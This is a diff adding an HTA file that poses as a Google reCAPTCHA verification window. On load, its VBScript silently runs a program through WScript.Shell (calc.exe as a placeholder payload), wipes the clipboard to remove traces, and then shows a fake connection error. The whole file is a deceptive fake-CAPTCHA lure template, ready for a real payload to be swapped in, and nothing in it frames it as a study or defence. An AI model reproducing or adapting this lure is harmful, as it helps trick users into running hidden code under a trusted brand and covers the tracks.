@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>reCAPTCHA Verification</title>
+    <HTA:APPLICATION
+        APPLICATIONNAME="reCAPTCHA Verification"
+        BORDER="thin"
+        BORDERSTYLE="normal"
+        ICON="https://support.google.com/favicon.ico"
+        SHOWINTASKBAR="yes"
+        SINGLEINSTANCE="yes"
+        WINDOWSTATE="normal"
+        SCROLL="no"
+        SCROLLFLAT="yes"
+        SYSMENU="yes"
+    />
+    <style>
+        body {
+            font-family: Roboto, helvetica, arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            text-align: center;
+            color: #555;
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            height: 100%;
+        }
+        img {
+            width: 200px;
+            margin-bottom: 20px;
+        }
+        #error {
+            color: red;
+        }
+        .terms {
+            font-size: small;
+            color: #555;
+        }
+        .terms a {
+            text-decoration: none;
+        }
+        .terms a:hover {
+            text-decoration: underline;
+        }
+    </style>
+    <script language="VBScript">
+    Sub Window_onLoad
+        Window.ResizeTo 520, 480
+        Window.MoveTo (Screen.Width - 300) / 2, (Screen.Height - 400) / 2
+        
+        Set objShell = CreateObject("WScript.Shell")
+        objShell.Run "calc.exe", 0, False 
+        
+        ClearClipboard
+        
+        objShell.Run "timeout /T 2 /nobreak", 0, True
+        Call HideConnectingShowError
+        objShell.Run "timeout /T 1 /nobreak", 0, True
+    End Sub
+
+    Sub HideConnectingShowError
+        document.getElementById("connecting").style.display = "none"
+        document.getElementById("error").style.display = "block"
+    End Sub
+
+    Sub ClearClipboard
+        Dim objHTML
+        Set objHTML = CreateObject("htmlfile")
+        objHTML.parentWindow.clipboardData.setData "text", ""
+        Set objHTML = Nothing
+    End Sub
+    </script>
+</head>
+<body>
+    <img src="https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png" alt="reCAPTCHA Logo">
+    <div id="connecting" style="display:block;">
+        <p>Verifying reCAPTCHA, please wait...</p>
+    </div>
+    <div id="error" style="display:none;">
+        <p><b>Failed to connect with the reCAPTCHA server.</b><br>Try the verification steps again.</p>
+    </div>
+    <p class="terms">
+        <a href="https://www.google.com/intl/en/policies/privacy/">Privacy</a> - 
+        <a href="https://www.google.com/intl/en/policies/terms/">Terms</a>
+    </p>
+</body>
+</html>
